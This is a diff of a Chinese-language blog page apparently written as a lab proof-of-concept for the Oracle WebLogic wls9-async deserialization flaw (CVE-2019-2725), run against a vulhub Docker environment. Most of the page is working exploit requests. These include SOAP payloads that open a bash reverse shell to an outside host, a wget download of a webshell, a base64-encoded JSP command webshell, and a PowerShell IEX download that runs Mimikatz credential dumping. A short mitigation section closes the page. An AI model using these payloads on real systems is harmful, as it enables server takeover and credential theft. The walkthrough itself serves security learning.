@@ -7,30 +7,31 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="description" content="描述Oracle WebLogic wls9-async反序列化远程命令执行漏洞（CNVD-C-2019-48814）。部分WebLogic版本中默认包含wls9_async_response包，为WebLogicServer提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP请求，获得目标服务器的权限，在未授权的情况下远程执行命令。 漏洞编号C">
+<meta name="keywords" content="weblogic,命令执行,CVE-2019-2725,CNVD-C-2019-48814">
 <meta property="og:type" content="article">
 <meta property="og:title" content="weblogic命令执行CVE-2019-2725">
 <meta property="og:url" content="https://brlove.github.io/p/57ff.html">
 <meta property="og:site_name" content="Brlove&#39;s Blog">
 <meta property="og:description" content="描述Oracle WebLogic wls9-async反序列化远程命令执行漏洞（CNVD-C-2019-48814）。部分WebLogic版本中默认包含wls9_async_response包，为WebLogicServer提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP请求，获得目标服务器的权限，在未授权的情况下远程执行命令。 漏洞编号C">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-5.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-6.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-7.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-8.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-10.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-11.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-12.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-13.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-14.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-15.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-16.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-17.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-18.png">
-<meta property="og:updated_time" content="2019-05-08T12:19:55.044Z">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:updated_time" content="2019-06-20T09:33:20.563Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="weblogic命令执行CVE-2019-2725">
 <meta name="twitter:description" content="描述Oracle WebLogic wls9-async反序列化远程命令执行漏洞（CNVD-C-2019-48814）。部分WebLogic版本中默认包含wls9_async_response包，为WebLogicServer提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP请求，获得目标服务器的权限，在未授权的情况下远程执行命令。 漏洞编号C">
-<meta name="twitter:image" content="https://brlove.github.io/images/pasted-5.png">
+<meta name="twitter:image" content="https://brlove.github.io/images/loading.png">
     
     
         
@@ -88,6 +89,8 @@
     <br>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" href="d485.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" href="3e60.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -148,9 +151,21 @@
 
 
       
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="../categories/poc/">POC</a>
+    </div>
+
 
       
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="../tags/cnvd-c-2019-48814/">CNVD-C-2019-48814</a>, <a class="tag-link" href="../tags/cve-2019-2725/">CVE-2019-2725</a>, <a class="tag-link" href="../tags/weblogic/">weblogic</a>, <a class="tag-link" href="../tags/命令执行/">命令执行</a>
+    </div>
 
+
+<!-- 字数统计 -->
+      <div style="text-align:end;">本篇文章 <span class="post-count" style="color:green">799</span> 字</div>
     </div>
   </header>
   
@@ -171,39 +186,50 @@
 <h3 id="一、搭建weblogic漏洞环境"><a href="#一、搭建weblogic漏洞环境" class="headerlink" title="一、搭建weblogic漏洞环境"></a>一、搭建weblogic漏洞环境</h3><p>1.使用vulhub镜像搭建<a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">漏洞环境</a></p>
 <p>2.使用<a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">DaoCloud</a>加速docker拉取镜像</p>
 <pre class="line-numbers"><code class="language-bash">
+
 sudo curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io
+
 </code></pre>
 
 <p>3.这里可以使用CVE-2017-10271的docker环境</p>
 <pre class="line-numbers"><code class="language-bash">
+
 cd vulhub/weblogic/CVE-2017-10271
+
 </code></pre>
 
 <p>4.启动漏洞环境</p>
 <pre class="line-numbers"><code class="language-bash">
+
 sudo docker-compose up -d
+
 </code></pre>
 
-<p><img src="/images/pasted-5.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-5.png" alt="upload successful"></p>
 <p>5.游览器访问<a href="http://10.0.0.4:7001/即可看到一个404，说明weblogic成功启动" target="_blank" rel="noopener">http://10.0.0.4:7001/即可看到一个404，说明weblogic成功启动</a></p>
-<p><img src="/images/pasted-6.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-6.png" alt="upload successful"></p>
 <p>6.访问漏洞路径能看到此页面，说明极大几率存在漏洞</p>
 <p><a href="http://10.0.0.4:7001/_async/AsyncResponseService" target="_blank" rel="noopener">http://10.0.0.4:7001/_async/AsyncResponseService</a></p>
-<p><img src="/images/pasted-7.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-7.png" alt="upload successful"></p>
 <h3 id="二、nmap脚本探测weblogic反序列化命令执行漏洞"><a href="#二、nmap脚本探测weblogic反序列化命令执行漏洞" class="headerlink" title="二、nmap脚本探测weblogic反序列化命令执行漏洞"></a>二、nmap脚本探测weblogic反序列化命令执行漏洞</h3><pre class="line-numbers"><code class="language-bash">
+
 nmap -n -sV -p 7001 10.0.0.4 --script weblogic-wls9-async.nse
+
 </code></pre>
 
 <p>确定存在cve-2019-2725漏洞</p>
-<p><img src="/images/pasted-8.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-8.png" alt="upload successful"></p>
 <h3 id="三、Linux反弹shell"><a href="#三、Linux反弹shell" class="headerlink" title="三、Linux反弹shell"></a>三、Linux反弹shell</h3><h4 id="A、lin反弹shell"><a href="#A、lin反弹shell" class="headerlink" title="A、lin反弹shell"></a>A、lin反弹shell</h4><p>1.kali nc监听</p>
 <pre class="line-numbers"><code class="language-bash">
+
 nc -l -p 4444 -vvv
+
 </code></pre>
 
-<p><img src="/images/pasted-10.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-10.png" alt="upload successful"></p>
 <p>2.构造post包</p>
-<pre class="line-numbers"><code class="language-html">
+<pre class="line-numbers"><code class="language-html"><!--
+
 POST /_async/AsyncResponseService HTTP/1.1
 Host: 10.0.0.4:7001
 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
@@ -216,36 +242,39 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 Connection: keep-alive
 content-type: text/xml
 
-&#60;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" 
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" 
 xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
-&#60;soapenv:Header> 
-&#60;wsa:Action>xx&#60;/wsa:Action>
-&#60;wsa:RelatesTo>xx&#60;/wsa:RelatesTo>
-&#60;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-&#60;void class="java.lang.ProcessBuilder">
-&#60;array class="java.lang.String" length="3">
-&#60;void index="0">
-&#60;string>/bin/bash&#60;/string>
-&#60;/void>
-&#60;void index="1">
-&#60;string>-c&#60;/string>
-&#60;/void>
-&#60;void index="2">
-&#60;string>bash -i &#38;&#103;&#116;&#59;&#38;&#97;&#109;&#112;&#59;&#32; /dev/tcp/10.0.0.2/4444 0&#38;&#103;&#116;&#59;&#38;&#97;&#109;&#112;&#59;1&#60;/string>
-&#60;/void>
-&#60;/array>
-&#60;void method="start"/>&#60;/void>
-&#60;/work:WorkContext>
-&#60;/soapenv:Header>
-&#60;soapenv:Body>
-&#60;asy:onAsyncDelivery/>
-&#60;/soapenv:Body>&#60;/soapenv:Envelope>
+<soapenv:Header> 
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>
+
 如果是直接copy的源码，那就html实体编码转换下
-</code></pre>
 
-<p><img src="/images/pasted-11.png" alt="upload successful"></p>
+--></code></pre>
+
+<p><img src="/images/loading.png" data-original="/images/pasted-11.png" alt="upload successful"></p>
 <h4 id="B、上传webshell"><a href="#B、上传webshell" class="headerlink" title="B、上传webshell"></a>B、上传webshell</h4><p>1.post包</p>
-<pre class="line-numbers"><code class="language-html">
+<pre class="line-numbers"><code class="language-html"><!--
+
 POST /_async/AsyncResponseService HTTP/1.1
 Host: 10.0.0.4:7001
 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
@@ -258,64 +287,70 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 Connection: keep-alive
 content-type: text/xml
 
-&#60;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" 
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" 
 xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
-&#60;soapenv:Header> 
-&#60;wsa:Action>xx&#60;/wsa:Action>
-&#60;wsa:RelatesTo>xx&#60;/wsa:RelatesTo>
-&#60;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-&#60;void class="java.lang.ProcessBuilder">
-&#60;array class="java.lang.String" length="3">
-&#60;void index="0">
-&#60;string>/bin/bash&#60;/string>
-&#60;/void>
-&#60;void index="1">
-&#60;string>-c&#60;/string>
-&#60;/void>
-&#60;void index="2">
-&#60;string> wget http://192.168.31.230/webshell.jsp.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&#60;/string>
-&#60;/void>
-&#60;/array>
-&#60;void method="start"/>&#60;/void>
-&#60;/work:WorkContext>
-&#60;/soapenv:Header>
-&#60;soapenv:Body>
-&#60;asy:onAsyncDelivery/>
-&#60;/soapenv:Body>&#60;/soapenv:Envelope>
+<soapenv:Header> 
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string> wget http://192.168.31.230/webshell.jsp.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>
 
-</code></pre>
+--></code></pre>
 
-<p><img src="/images/pasted-12.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-12.png" alt="upload successful"></p>
 <p>2.上传的webshell路径：</p>
 <p>/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</p>
 <p>3.访问<a href="https://github.com/tennc/webshell/blob/master/jsp/JspSpy.jsp" target="_blank" rel="noopener">webshell</a></p>
 <p><a href="http://10.0.0.4:7001/_async/webshell.jsp" target="_blank" rel="noopener">http://10.0.0.4:7001/_async/webshell.jsp</a></p>
-<p><img src="/images/pasted-13.png" alt="upload successful"></p>
-<h4 id="C、写ewbshell"><a href="#C、写ewbshell" class="headerlink" title="C、写ewbshell"></a>C、写ewbshell</h4><pre class="line-numbers"><code class="language-html">
-.....
-    &#60string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&#60/string>
-.......
+<p><img src="/images/loading.png" data-original="/images/pasted-13.png" alt="upload successful"></p>
+<h4 id="C、写ewbshell"><a href="#C、写ewbshell" class="headerlink" title="C、写ewbshell"></a>C、写ewbshell</h4><pre class="line-numbers"><code class="language-html"><!--
 
-</code></pre>
+....
+    <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
+....
+
+--></code></pre>
 
 
 <h4 id="D、查看本地webshell文件"><a href="#D、查看本地webshell文件" class="headerlink" title="D、查看本地webshell文件"></a>D、查看本地webshell文件</h4><p>1.查看docker容器id</p>
 <pre class="line-numbers"><code class="language-html">
+
 sudo docker ps
+
 </code></pre>
 
-<p><img src="/images/pasted-14.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-14.png" alt="upload successful"></p>
 <p>2.进入容器</p>
 <pre class="line-numbers"><code class="language-html">
+
 sudo docker exec -it c30ef75c5815 /bin/bash
+
 </code></pre>
 
-<p><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-15.png" alt="upload successful"></p>
 <p>3.webshell上传成功</p>
-<p><img src="/images/pasted-16.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-16.png" alt="upload successful"></p>
 <h3 id="四、windows反弹shell"><a href="#四、windows反弹shell" class="headerlink" title="四、windows反弹shell"></a>四、windows反弹shell</h3><h3 id="A、win反弹shell"><a href="#A、win反弹shell" class="headerlink" title="A、win反弹shell"></a>A、win反弹shell</h3><p>可以使用CS生成一个payload.ps1的powershell脚本</p>
 <p>1.方法一</p>
-<pre class="line-numbers"><code class="language-html">
+<pre class="line-numbers"><code class="language-html"><!--
+
 POST /_async/AsyncResponseService HTTP/1.1
 Host: 10.0.0.4:7001
 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
@@ -328,40 +363,45 @@ User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
 Connection: keep-alive
 content-type: text/xml
 
-&#60soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
-&#60soapenv:Header> 
-&#60wsa:Action>xx&#60/wsa:Action>
-&#60wsa:RelatesTo>xx&#60/wsa:RelatesTo>
-&#60work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-&#60void class="java.lang.ProcessBuilder">
-&#60array class="java.lang.String" length="3">
-&#60void index="0">
-&#60string>cmd&#60/string>
-&#60/void>
-&#60void index="1">
-&#60string>/c&#60/string>
-&#60/void>
-&#60void index="2">
-&#60string>powershell "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/payload.ps1'); Invoke-Mimikatz -DumpCreds"&#60/string>
-&#60/void>
-&#60/array>
-&#60void method="start"/>&#60/void>
-&#60/work:WorkContext>
-&#60/soapenv:Header>
-&#60soapenv:Body>
-&#60asy:onAsyncDelivery/>
-&#60/soapenv:Body>&#60/soapenv:Envelope>
 
-</code></pre>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
+<soapenv:Header> 
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>cmd</string>
+</void>
+<void index="1">
+<string>/c</string>
+</void>
+<void index="2">
+<string>powershell "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/payload.ps1'); Invoke-Mimikatz -DumpCreds"</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>
 
-<p><img src="/images/pasted-17.png" alt="upload successful"><br>(ps: 由于搭建的是linux环境，这里的win环境为网图)</p>
+--></code></pre>
+
+<p><img src="/images/loading.png" data-original="/images/pasted-17.png" alt="upload successful"><br>(ps: 由于搭建的是linux环境，这里的win环境为网图)</p>
 <p>2.方法二</p>
-<pre class="line-numbers"><code class="language-html">
-&#60string>certutil -urlcache -split -f http://ip:port/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&#60/string>
+<pre class="line-numbers"><code class="language-html"><!--
 
-</code></pre>
+....
+    <string>certutil -urlcache -split -f http://ip:port/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
+....
 
-<h4 id="B、直接写shell"><a href="#B、直接写shell" class="headerlink" title="B、直接写shell"></a>B、直接写shell</h4><pre class="line-numbers"><code class="language-html">
+--></code></pre>
+
+<h4 id="B、直接写shell"><a href="#B、直接写shell" class="headerlink" title="B、直接写shell"></a>B、直接写shell</h4><pre class="line-numbers"><code class="language-html"><!--
+
 POST /_async/AsyncResponseService HTTP/1.1
 Host: ip:port
 Content-Length: 854
@@ -373,40 +413,54 @@ Connection: keep-alive
 content-type: text/xml
 
 
-&#60soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">&#60soapenv:Header>&#60wsa:Action>xx&#60/wsa:Action>&#60wsa:RelatesTo>xx&#60/wsa:RelatesTo>&#60work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">&#60java version="1.8.0_131" class="java.beans.xmlDecoder">&#60object class="java.io.PrintWriter">&#60string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&#60/string>&#60void method="println">&#60string>&#60![CDATA[
-&#60%
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string><void method="println"><string><![CDATA[
+<%
     if("123".equals(request.getParameter("pwd"))){
         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
         int a = -1;          
         byte[] b = new byte[1024];          
-        out.print("&#60pre>");          
+        out.print("<pre>");          
         while((a=in.read(b))!=-1){
             out.println(new String(b));          
         }
-        out.print("&#60/pre>");
+        out.print("</pre>");
     } 
-    %>]]>
-&#60/string>&#60/void>&#60void method="close"/>&#60/object>&#60/java>&#60/work:WorkContext>&#60/soapenv:Header>&#60soapenv:Body>&#60asy:onAsyncDelivery/>&#60/soapenv:Body>&#60/soapenv:Envelope>
+    %>]】> (ps:两个]会导致搜索bug，用中文状态代替) 
+</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
 
 </code></pre>
 
 <p>访问webshell</p>
 <pre class="line-numbers"><code class="language-html">
+
 http://10.0.0.4:7001/_async/webshell2.jsp?pwd=123&cmd=whoami
+
+--></code></pre>
+
+<p><img src="/images/loading.png" data-original="/images/pasted-18.png" alt="upload successful"></p>
+<h3 id="五、解决方案"><a href="#五、解决方案" class="headerlink" title="五、解决方案"></a>五、解决方案</h3><p>1.删除bea_wls9_async_response.war包并重启服务器</p>
+<pre class="line-numbers"><code class="language-html">
+
+Weblogic9版本：
+/%WLS_HOME%/weblogic92/server/lib/bea_wls9_async_response.war
+
+Weblogic 10版本：     
+/%WLS_HOME%/wlserver_10.3/server/lib/bea_wls9_async_response.war
+
+Weblogic12版本：
+/%WLS_HOME%/oracle_common/modules/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war
+
 </code></pre>
 
-<p><img src="/images/pasted-18.png" alt="upload successful"></p>
-<h3 id="五、解决方案"><a href="#五、解决方案" class="headerlink" title="五、解决方案"></a>五、解决方案</h3><p>1.删除bea_wls9_async_response.war包并重启服务器</p>
-<p><pre class="line-numbers"><code class="language-html"><br>Weblogic9版本：<br>/%WLS_HOME%/weblogic92/server/lib/bea_wls9_async_response.war</code></pre></p>
-<p>Weblogic 10版本：<br>/%WLS_HOME%/wlserver_10.3/server/lib/bea_wls9_async_response.war</p>
-<p>Weblogic12版本：<br>/%WLS_HOME%/oracle_common/modules/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war</p>
-<p><br>注：wls9_async_response.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。</p>
+<p>注：wls9_async_response.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。</p>
 <p>2.禁用bea_wls9_async_response组件</p>
 <p>用户可通过在weblogic启动参数中禁用bea_wls9_async_response的方式，对此漏洞形成临时防护。</p>
 <p>在禁用不安全组件前，需请开发人员确认应用系统是否使用了weblogic提供的异步WebService功能，排查方法请附录章节。如果确认没有使用，可以使用如下方式禁用此功能：</p>
 <p>a）以windows系统为例，在启动文件（%DOMAIN_HOME%\bin\startWeblogic.cmd）中加如下参数：<br>set JAVA_OPTIONS=%JAVA_OPTIONS% -Dweblogic.wsee.skip.async.response=true<br>set JAVA_OPTIONS=%JAVA_OPTIONS% -Dweblogic.wsee.wstx.wsat.deployed=false<br>c）测试结果没有问题后，重启Weblogic服务，使参数生效。b)  对应用程序进行严格测试。</p>
 <h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/Qr1tlEk5PUsjEiLO8-5v1A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Qr1tlEk5PUsjEiLO8-5v1A</a><br><a href="https://www.jianshu.com/p/c4982a845f55" target="_blank" rel="noopener">https://www.jianshu.com/p/c4982a845f55</a><br><a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener">https://www.cnblogs.com/liliyuanshangcao/p/10820583.html</a><br><a href="https://mp.weixin.qq.com/s/LrfiwuEkVqBqndujyo9UMQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LrfiwuEkVqBqndujyo9UMQ</a><br><a href="https://mp.weixin.qq.com/s/hWKO2gzy7O-XmyHZ9fqq8g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/hWKO2gzy7O-XmyHZ9fqq8g</a></p>
 
+<!-- 时长 -->
+    <div style="margin-top:100px; text-align:end; margin-bottom:50px;">你已阅读 <span class="post-count" style="color:green">3</span> 分钟</div>
   </div>
 </article>
 
@@ -500,5 +554,5 @@ http://10.0.0.4:7001/_async/webshell2.jsp?pwd=123&cmd=whoami
 <!-- Disqus Comments -->
 
 
-</body>
+<script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
 </html>
